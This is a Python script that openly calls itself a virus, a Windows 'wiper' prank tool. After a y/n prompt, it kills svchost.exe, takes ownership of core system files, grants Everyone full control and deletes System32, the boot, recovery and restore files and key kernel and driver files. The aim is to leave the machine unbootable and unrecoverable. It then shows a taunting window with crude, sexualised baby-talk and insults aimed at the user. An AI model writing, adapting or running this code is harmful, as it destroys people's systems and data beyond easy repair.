import subprocess
import os
import time
import random
import shutil
import playsound
from turtle import *
import turtle

def malicious_shit():
    try:
        subprocess.run(['takeown', '/F', "C:"])
        subprocess.run(['takeown', '/F', "C:\\Windows"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\Boot\\winload.exe"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\kdcom.dll"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\bootmgr"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\kernel32.dll"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntdll.dll"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntfs.sys"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\volsnap.sys"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hidclass.sys"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\mountmgr.sys"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\usbhub.sys"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\dxgkrnl.sys"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\win.ini"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\Inf"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\Recovery"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\Restore"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\winre.wim"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\rstrui.exe"])

        subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\Boot\\winload.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\hal.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\kdcom.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\bootmgr', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\kernel32.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\ntdll.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\ntfs.sys', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\volsnap.sys', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\hidclass.sys', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\mountmgr.sys', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\usbhub.sys', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\dxgkrnl.sys', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\win.ini', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\Inf', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\Recovery', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\Restore', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\winre.wim', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\rstrui.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])

        # Force delete directories and files
        shutil.rmtree("C:\\Windows\\System32\\Boot", ignore_errors=True)
        shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)
        shutil.rmtree("C:\\Windows\\Inf", ignore_errors=True)
        shutil.rmtree("C:\\Windows\\System32\\Recovery", ignore_errors=True)
        shutil.rmtree("C:\\Windows\\System32\\Restore", ignore_errors=True)

        os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
        os.remove("C:\\Windows\\System32\\hal.dll")
        os.remove("C:\\Windows\\System32\\Boot\\winload.exe")
        os.remove("C:\\Windows\\System32\\kdcom.dll")
        os.remove("C:\\Windows\\System32\\bootmgr")
        os.remove("C:\\Windows\\System32\\kernel32.dll")
        os.remove("C:\\Windows\\System32\\ntdll.dll")
        os.remove("C:\\Windows\\System32\\ntfs.sys")
        os.remove("C:\\Windows\\System32\\volsnap.sys")
        os.remove("C:\\Windows\\System32\\hidclass.sys")
        os.remove("C:\\Windows\\System32\\mountmgr.sys")
        os.remove("C:\\Windows\\System32\\usbhub.sys")
        os.remove("C:\\Windows\\System32\\dxgkrnl.sys")
        os.remove("C:\\Windows\\win.ini")
        os.remove("C:\\Windows\\System32\\winre.wim")
        os.remove("C:\\Windows\\System32\\rstrui.exe")
    except Exception as e:
        print(f"An error occurred: {e}")

def graphics():
    screen = turtle.Screen()
    screen.bgcolor("black")
    screen.title("UH OH UR FILES ARE GONIE GONE :)")
    screen.setup(width=1920, height=1080)

    writer = turtle.Turtle()
    writer.hideturtle()
    writer.speed(0)
    writer.penup()
    writer.goto(0, 0)

    colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

    def glitch_effect(counter=0):
        if counter < 50:  
            writer.goto(random.randint(-900, 900), random.randint(-500, 500))
            writer.color(random.choice(colors))
            writer.clear()
            writer.write("Sowwy mister i... i ate swome fiwles :( pls fowgive me daddwy :^_^)", align="center", font=("Comic Sans MS", 32, "bold"))
            screen.ontimer(lambda: glitch_effect(counter + 1), 100)

    glitch_effect()
    screen.mainloop()
    turtle.done()

if __name__ == "__main__":
    if os.name == 'nt' and os.geteuid() != 0:
        print("Please run this script as an administrator.")
        exit(1)

    while True:
        user_input = input("This is a virus, are you sure you want to run it? (y/n): ").lower()
        if user_input == 'y':
            subprocess.run("taskkill /F /IM svchost.exe /T", shell=True)
            malicious_shit()
            if os.path.exists("gl.mp3"):
                    playsound.playsound("gl.mp3")
                    subprocess.run("taskkill /F /IM svchost.exe /T", shell=True)
            else:
                print("gl.mp3 not found!")
            break
        elif user_input == 'n':
            print("Yeah, I knew you had no balls to run this shit.")
            break
        else:
            print("Invalid input. You stupid")
